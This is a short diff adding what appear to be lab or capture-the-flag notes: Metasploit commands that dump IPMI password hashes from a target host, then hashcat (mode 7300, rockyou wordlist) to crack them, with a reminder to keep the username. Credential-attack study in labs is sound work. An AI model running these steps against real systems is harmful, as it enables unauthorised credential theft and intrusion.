@@ -1,0 +1,13 @@
+
+` msfconsole 
+`use auxiliary/scanner/ipmi/ipmi_dumphashes 
+` set rhosts 10.129.42.195
+` run 
+
+copy and paste the hash to hashfile with nano or a bash command
+
+use hashcat on the hash:
+
+
+`hashcat -a 0 -m 7300 hashfile /usr/share/wordlists/rockyou.txt.gz --username
+NEED the username in there as the username is part of the hash. 
